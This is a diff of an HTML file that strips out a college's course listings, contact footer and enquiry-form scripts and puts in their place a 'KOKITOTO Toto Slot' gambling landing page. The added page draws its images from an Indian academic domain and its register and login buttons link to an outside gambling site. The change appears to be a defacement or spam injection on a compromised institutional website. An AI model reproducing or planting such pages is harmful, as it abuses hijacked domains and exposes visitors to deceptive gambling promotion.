-                                <p>Founded on the principles of innovation, collaboration, and a passion for learning, Anderson College
-has been a cornerstone of academic excellence since its inception.<br><br>
-At Anderson College, we foster a global perspective and empower our students to explore their
-intellectual curiosity. We believe in developing critical thinking skills that will not only benefit them
-academically but also in their future careers.<br><br>
-                                <a href="about-us/" class="btn-style-one theme-btn"><span class="txt">know more</span></a></p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-
-<section class="course-area py-5 bg-light p-relative " data-animation="fadeInUp animated" data-delay=".2s">
-                <div class="container py-5">
-                    <div class="section-title center-align mb-5 text-center wow fadeInDown  animated" data-animation="fadeInDown" data-delay=".4s" style="visibility: visible; animation-name: fadeInDown;">
-                                 <h5><i class="fa-solid fa-graduation-cap"></i> Our Courses</h5>
-                                <h2>
-                                 Courses We Offer
-                                </h2>
-                             
-                            </div>
-                    <div class="course-slider-carousel owl-carousel py-3 owl-theme align-items-center">
-                           
-                            <!-- <div class="courses-box hover-zoomin">
-                                <div class="thumb fix">
-                                    <a href="<?php echo $protocol;?>/Program/Certificate-II-in-Security-Operations/"><img src="images/Courses-img.jpg" class="img-fluid" alt="contact-bg-an-01"></a>
-                                </div>
-                                <div class="courses-content">                                    
-                                    <h3> CPP20218 - Certificate II in Security Operations</h3><p><b>CRICOS Code: 111110D</b></p>
-
-                                    <p><b>Domestic Students:</b> 4 Weeks<br><b>International Students:</b> 9 Weeks</p>
-                                           <p>Description: This qualification reflects the role of a security officer, responsible for maintaining safety and security by patrolling, protecting or guarding property while unarmed,...</p>
-                                    <a href="<?php echo $protocol;?>/Program/Certificate-II-in-Security-Operations/" class="readmore">Read More <i class="fa-solid fa-arrow-right"></i></a>
-                                </div>
-                                <div class="icon">
-                                 <img src="images/book-ico.png" alt="book-ico">
-                                </div>
-                            </div> -->
-                  <div class="courses-box hover-zoomin">
-                                <div class="thumb fix"><a href="<?php echo $protocol;?>/Program/CHC33021-Certificate-III-in-Individual-Support/"><img src="../images/Courses-img3.jpg" class="img-fluid" alt="contact-bg-an-01"></a>
-                                </div> 
-                                <div class="courses-content"><!-- <div class="cat"><i class="fa-regular fa-clock"></i> Duration: 9 weeks</div> -->
-                                    <h3>CHC33021 Certificate III in Individual Support </h3>
-                                    <p><b>CRICOS Code: 115187F</b><br>
-                                    <b>Duration: </b> 64 Weeks</p>
-                                           <p>This qualification reflects the role of individuals in the community, home or residential care setting who work under supervision...</p>
-
-                                           <a href="<?php echo $protocol;?>/Program/CHC33021-Certificate-III-in-Individual-Support/" class="readmore">Read More 
-                                            <i class="fa-solid fa-arrow-right"></i>
-                                        </a>
-                                           <a href="<?php echo $protocol;?>/course-brochure/Course Brochure – CHC33021 Certificate III in Individual Support.pdf" download="Course Brochure –CHC33021 Certificate III in Individual Support" class="readmore">Download Brochure <i class="fa-solid fa-download"></i></a>
-
-
-                                </div>
-                                <div class="icon">
-                                 <img src="../images/book-ico.png" alt="img">
-                                </div>
-                            </div>
-<div class="courses-box hover-zoomin">
-                                <div class="thumb fix">
-                                    <a href="<?php echo $protocol;?>/Program/Certificate-IV-in-Disability-Support/"><img src="../images/Courses-img5.jpg" class="img-fluid" alt="contact-bg-an-01"></a>
-                                </div> 
-                                <div class="courses-content">                                    
-                                    <!-- <div class="cat"><i class="fa-regular fa-clock"></i> Duration: 9 weeks</div> -->
-                                    <h3>CHC43121 - Certificate IV in Disability Support </h3>
-                                    <p><b>CRICOS Code: 115188E</b><br>
-                                    <b>Duration: </b> 40 Weeks</p>
-                                           <p>This qualification reflects the role of individuals in a range of community settings and peoples’ homes, who provide support...</p>
-                                   
-                                           <a href="<?php echo $protocol;?>/Program/Certificate-IV-in-Disability-Support/" class="readmore">Read More 
-                                            <i class="fa-solid fa-arrow-right"></i>
-                                        </a>
-                                           <a href="<?php echo $protocol;?>/course-brochure/Course Brochure – CHC43121 Certificate IV in Disability Support.pdf" download="Course Brochure – CHC43121 Certificate IV in Disability Support.pdf" class="readmore">Download Brochure <i class="fa-solid fa-download"></i></a>
-                                </div>
-                                <div class="icon">
-                                 <img src="../images/book-ico.png" alt="img">
-                                </div>
-                            </div>
-                            <div class="courses-box hover-zoomin">
-                                <div class="thumb fix">
-                                    <a href="<?php echo $protocol;?>/Program/Diploma-of-Community-Services/"><img src="../images/Courses-img6.jpg" class="img-fluid" alt="contact-bg-an-01"></a>
-                                </div> 
-                                <div class="courses-content">                                    
-                                    <!-- <div class="cat"><i class="fa-regular fa-clock"></i> Duration: 9 weeks</div> -->
-                                    <h3>CHC52021 Diploma of Community Services </h3>
-                                    <p><b>CRICOS Code: 115189D</b><br>
-                                    <b>Duration: </b> 104 Weeks</p>
-                                           <p>This qualification reflects the role of community services workers involved in the delivery, management and coordination...</p>
-                                           <a href="<?php echo $protocol;?>/Program/Diploma-of-Community-Services/" class="readmore">Read More 
-                                            <i class="fa-solid fa-arrow-right"></i>
-                                        </a>
-                                         <a href="<?php echo $protocol;?>/course-brochure/Course Brochure –CHC52021 Diploma of Community Services.pdf" download="Course Brochure –CHC52021 Diploma of Community Services" class="readmore">Download Brochure <i class="fa-solid fa-download"></i></a>
-                                </div>
-                                <div class="icon">
-                                 <img src="../images/book-ico.png" alt="img">
-                                </div>
-                            </div>
-<div class="courses-box hover-zoomin">
-                                <div class="thumb fix">
-                                    <a href="<?php echo $protocol;?>/Program/Graduate-Diploma-of-Management/"><img src="../images/Courses-img4.jpg" class="img-fluid" alt="contact-bg-an-01"></a>
-                                </div> 
-                                <div class="courses-content">                                    
-                                    <!-- <div class="cat"><i class="fa-regular fa-clock"></i> Duration: 9 weeks</div> -->
-                                    <h3>BSB80120: Graduate Diploma of Management </h3>
-                                    <p><b>CRICOS Code: 115190M</b><br>
-                                    <b>Duration: </b> 52 Weeks</p>
-                                           <p>This qualification reflects the role of individuals who apply highly specialised knowledge and skills in the field of organisational...</p>
-                                           <a href="<?php echo $protocol;?>/Program/Graduate-Diploma-of-Management/" class="readmore">Read More 
-                                            <i class="fa-solid fa-arrow-right"></i>
-                                        </a>
-                                        <a href="<?php echo $protocol;?>/course-brochure/Course Brochure – BSB80120 Graduate Diploma of Management.pdf" download="Course Brochure – BSB80120 Graduate Diploma of Management" class="readmore">Download Brochure <i class="fa-solid fa-download"></i></a>
-                                </div>
-                                <div class="icon">
-                                 <img src="../images/book-ico.png" alt="img">
-                                </div>
-                            </div>
-                            <div class="courses-box hover-zoomin">
-                                <div class="thumb fix">
-                                    <a href="<?php echo $protocol;?>/Program/ELICOS-General-English-Elementary-to-Advanced/"><img src="../images/Courses-img7.jpg" class="img-fluid" alt="contact-bg-an-01"></a>
-                                </div> 
-                                <div class="courses-content">                                    
-                                    <!-- <div class="cat"><i class="fa-regular fa-clock"></i> Duration: 9 weeks</div> --><h3>ELICOS - General English
-Elementary to Advanced</h3>
-                                    <p><b>CRICOS Code: 115506G</b><br>
-                                    <b>Duration: </b> 62 Weeks</p>
-                                           <p>The standard course length is 50 weeks of General English. Each week, there are 20 face-to-face contact hours...</p>
-                                           <a href="<?php echo $protocol;?>/Program/ELICOS-General-English-Elementary-to-Advanced/" class="readmore">Read More 
-                                            <i class="fa-solid fa-arrow-right"></i>
-                                        </a><a href="<?php echo $protocol;?>/course-brochure/ELICOS - General English.pdf" download="ELICOS - General English" class="readmore">Download Brochure <i class="fa-solid fa-download"></i></a>
-                                </div>
-                                <div class="icon">
-                                 <img src="../images/book-ico.png" alt="img">
-                                </div>
-                            </div>
-
-
-
-                        </div></div>
-                        
-                        
-                                                        
-                    </div>
-                    
-                </div>
-            </section>
-<section class="footer_one">
-        <div class="container">
-            <div class="row">
-                <div class="col-sm-8 col-md-8 col-lg-4 my-4">
-                    <div class="footer_contact_widget text-white">
-                        <h4>Anderson College </h4>
-                        <!-- <p><i class="fa-solid fa-location-dot"></i> &nbsp; Level 6, 190 Queen St, Melbourne VIC 3000</p>          -->
-<!-- <h6><b> Brisbane: </b></h6><p><i class="fa-solid fa-location-dot"></i> &nbsp; Office 10, 2092 Logan Rd, Upper Mount Gravatt, QLD, 4122</p> -->
-                     <h6><b> Campus Address:</b></h6>
-               <p><i class="fa-solid fa-location-dot"></i> &nbsp; Level 4, 255 Williams St, Melbourne VIC 3000.</p>
-               <!-- <p><i class="fa-solid fa-phone"></i> &nbsp; 0432 289 077</p> -->
-               <h6><b>Simulation Room Address:</b></h6>
-               <p><i class="fa-solid fa-location-dot"></i> &nbsp; Level 4, 255 Williams St, Melbourne VIC 3000.</p>
-                          
-                   
-
-
-
-
-                        <!-- <p><i class="fa-solid fa-phone"></i> &nbsp; 0432 289 077</p> -->
-                        <p><i class="fa-solid fa-phone"></i> &nbsp; <a href="tel:0433 518 191 ">0433 518 191 </a></p>
-                      <!--   <p><i class="fa-solid fa-phone"></i> &nbsp; 
-                        	<a href="tel:0411 333 327 ">0411 333 327 </a>
-                        </p> -->
-                        <p><i class="fa-regular fa-envelope"></i> &nbsp; info@Andersoncollege.vic.edu.au</p>
-                        <p> <b>RTO Code:</b> 45913<br>
-<b>CRICOS Provider No:</b> 04057F<br>
-<b>ABN Number:</b> 48 644 259 423
-</p>
-                      
-                    </div>
-                </div>
-                <div class="col-sm-4 col-md-4 col-lg-2 my-4">
-                    <div class="footer_company_widget">
-                        <h4>COMPANY</h4>
-                        <ul class="list-unstyled">
-                            <li><a href="<?php echo $protocol;?>/about-us/">About Us</a></li>
-                            <li><a href="<?php echo $protocol;?>/why-study/">Why Study at Anderson</a></li>
-                            <li><a href="<?php echo $protocol;?>/Enrol-Now/">ENROL Now</a></li>
-                            <li><a href="<?php echo $protocol;?>/student-information/">Students Information</a></li>
-                            <li><a href="<?php echo $protocol;?>/contact-us/">Contact Us</a></li>
-                        </ul>
-                    </div>
-                </div>
-                
-                <div class="col-sm-6 col-md-4 col-lg-2 my-4">
-                    <div class="footer_support_widget">
-                        <h4>Important Links</h4>
-                        <ul class="list-unstyled">
-                               <li><a  href="https://www.asqa.gov.au/" target="_blank">ASQA</a></li>
-             <li><a href="https://immi.homeaffairs.gov.au/visas/getting-a-visa/visa-finder/study" target="_blank">Department of Home Affairs </a></li>
-             <li><a href="https://www.education.gov.au/esos-framework" target="_blank">ESOS Framework </a></li>
-             <li><a href="https://internationaleducation.gov.au/Regulatory-Information/Pages/National-Code-2018-Factsheets-.aspx" target="_blank">The National Code </a></li>
-             <li><a href="https://tps.gov.au/Home/Login" target="_blank">Tuition Protection Service </a></li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="col-sm-6 col-md-8  col-lg-4 my-4 text-sm-center">
-                      <!-- <img src="images/venturebyoptas.png" class="img-fluid" width="200" alt="venturebyoptas.png"> -->
-                    <div class="footer_form">
-<h5 class="mb-3 text-white">JOIN OUR MAILING LIST</h5>
-<p class="text-white">Find out more about our  program</p>
-  <form action="" id="f-form">
-    <div class="mb-3 mt-3">
-      <input type="text" class="form-control" id="name1" placeholder="Name" name="name" required>
-    </div>
-    <div class="mb-3">
-      <input type="email" class="form-control" id="email1" placeholder="Email" name="email" required>
-      <input type="hidden" class="form-control" id="form_name1" value="Index-Footer-Form" placeholder="Email" name="form_name">
-    </div>
-    <input type="submit" name="sub_form" value="KEEP IN TOUCH" class="btn btn-warning btn-lg btn_submit_App1">
-  </form>
-  </div>
-                </div>
-            </div>
-                       <div class="row"><div class="col-12">
-                <div class="footer_support_widget text-center">
-               <h4>Acknowledgement of Country</h4>
-               <p class="text-white-50">We acknowledge the Traditional Owners and Custodians of Country throughout Australia and acknowledge their continuing connection to land, water, and community. We pay our respects to the people, the cultures, and the Elders past and present.<br><br>
-           We are a place where people of LGBTQIA+ communities are welcomed, respected, and supported.</p>
-            </div>
-           </div>
-           </div>
-        </div>
-    </section>
-<section class="footer_bottom_area py-4">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-6 offset-lg-3">
-                    <div class="copyright-widget text-center">
-                        <p class="text-white mb-0 pb-0">
-                         © <?php echo date('Y');?> Anderson College. All rights reserved.   </p>
-
-                    </div>
-
-
-                </div>
-            </div>
-        </div>
-    </section>
-     
-
-
-
-    <div class="modal custom-modal " id="myModal" aria-modal="true" role="dialog">
-  <div class="modal-dialog ">
-    <div class="modal-content">
- <!-- Modal body -->
-      <div class="modal-body"> <button type="button" class="btn-close  float-end " style="margin-top:-12px !important; margin-right: -10px;  z-index: 99;border: 1px solid #000;border-radius: 30px;
-    padding: 5px;" data-bs-dismiss="modal"></button>
-         <h4 class="modal-title mb-5">How can I help?</h4>
-<form id="form-id">
-  <div class="form-group mb-3">
-    <input type="text" id="name" name="name" placeholder="Full Name" class=" form-control">
-  </div>
-  <div class="form-group mb-3">
-    <input type="email" id="email" name="email" placeholder="Email Id" class=" form-control" required>
-  </div>
-  <div class="form-group mb-3">
-    <input type="text" id="phone" name="phone" placeholder="Phone"class=" form-control" required>
-  </div>
-  <div class="form-group mb-3">
-    <input type="text" id="address" name="address" placeholder="Address" class=" form-control">
-  </div>
-  <div class="form-group mb-3">
-    <textarea type="text"id="desc" name="desc" placeholder="Message" class=" form-control">    </textarea>
-    <input type="hidden" id="form_name" name="form_name" value="Enquiry-Form" class=" form-control">
-  </div>
-  <!-- <div class="form-group mb-3">
-    <p class="text-white"> <input class="form-check-input" type="checkbox" id="keep_loop" name="keep_loop" value="Yes" checked> Keep me in the loop</p>
-  </div>
-
-<div class="form-group mb-3 text-center">
-      <div class="g-recaptcha m-auto" data-sitekey="6LfKURIUAAAAAO50vlwWZkyK_G2ywqE52NU7YO0S" data-callback="verifyRecaptchaCallback" data-expired-callback="expiredRecaptchaCallback">
-   </div>
-      <input class="form-control d-none" data-recaptcha="true" required data-error="Please complete the Captcha">
-        <div class="help-block with-errors"></div>
-     </div> -->
-
-     <div class="form-group my-3 text-center">
-     <button type="submit" name="UVoDYnVyYTlOluzlBM5M3Rw" value="SUBMIT" class="btn-style-one theme-btn float-end text-white btn_submit_App"><span class="txt">Submit</span></button>
-   </div></form>
-
-         
+  <main class="shell">
+    <section class="card">
+      <div class="logo-slot" aria-label="Logo KOKITOTO">
+        <a class="logo-link" href="https://gmvrkl.ac.in/" rel="nofollow">
+          <div class="logo-media">
+            <amp-img
+              class="logo-image"
+              src="https://gmvrkl.ac.in/img/logo-kokitoto.png"
+              width="200"
+              height="30"
+              layout="responsive"
+              alt="Logo KOKITOTO"
+            ></amp-img>
+          </div>
+        </a>
       </div>
 
-    </div>
-  </div>
-</div>
-<style type="text/css">
+      <div class="hero-slot" aria-label="KOKITOTO Toto Slot">
+        <div class="hero-media">
+          <amp-img
+            class="hero-image"
+            src="https://gmvrkl.ac.in/img/kokitoto-toto-slot.webp"
+            width="800"
+            height="800"
+            layout="responsive"
+            alt="KOKITOTO Toto Slot"
+          ></amp-img>
+        </div>
+      </div>
 
-
-</style>
-
- <script src="js/jquery.min.js"></script> 
-  <script src="js/bootstrap.bundle.min.js"></script>
-
-    <script type='text/javascript' src='js/owl.js'></script>
-    <script type='text/javascript' src='js/script.js'></script>
- 
-<script>
-
-  $("#f-form").submit(function () {
-    var formData = {
-      name: $("#name1").val(),
-      email: $("#email1").val(),
-      form_name: $("#form_name1").val(),
-    };
-    
-    $.ajax({
-      type: "POST",
-      url: "data_submit.php",
-      data: formData,
-      dataType: "json",
-      encode: true,
-      beforeSend:function(){
-          $('.btn_submit_App1').attr("disabled","disabled");
-          $('#f-form').css("opacity",".5");
-        },
-    }).done(function (data) {
-      if(data == 1){
-        alert('Submit Successfully');
-        $('#f-form').css("opacity","");
-        $(".btn_submit_App1").removeAttr("disabled");
-        $("#f-form").trigger('reset');
-      }else{
-        alert('Something went wrong');
-      }
-    });
-
-    event.preventDefault();
-  });
-
-</script>
-
-<script>
-
-    $("#form-id").submit(function () {
-      var formData = {
-        name: $("#name").val(),
-        email: $("#email").val(),
-        phone: $("#phone").val(),
-        address: $("#address").val(),
-        message: $("#desc").val(),
-        form_name: $("#form_name").val(),
-      };
-      var email = $("#email").val();
-      if (email == '') {
-        $("#email").css("border-color", "red");
-        return false;
-      }
-      
-      $.ajax({
-        type: "POST",
-        url: "data_submit.php",
-        data: formData,
-        dataType: "json",
-        encode: true,
-        beforeSend: function(){
-         // $('.btn_submit_App').attr("disabled","disabled");
-          $('#form-id').css("opacity",".5");
-        },
-      }).done(function (data) {
-        if(data == 1){
-          alert('Submit Successfully');
-        $("#form-id").trigger('reset');
-        $('#form-id').css("opacity","");
-        //$(".btn_submit_App").removeAttr("disabled");
-        location.reload(true);
-        }else{
-          alert('Something went wrong');
-        }
-      });
-    
-      event.preventDefault();
-    });
-    
-    </script>
+      <div class="actions">
+        <a class="button button-primary" href="https://linkkoki.me/membervvip" rel="nofollow"><span class="button-text">Daftar</span></a>
+        <a class="button button-secondary" href="https://linkkoki.me/membervvip" rel="nofollow"><span class="button-text">Login</span></a>
+      </div>
+    </section>
+    <footer class="page-footer">&copy; 2026 KOKITOTO. All Rights Reserved</footer>
+  </main>
 </body>
 </html>
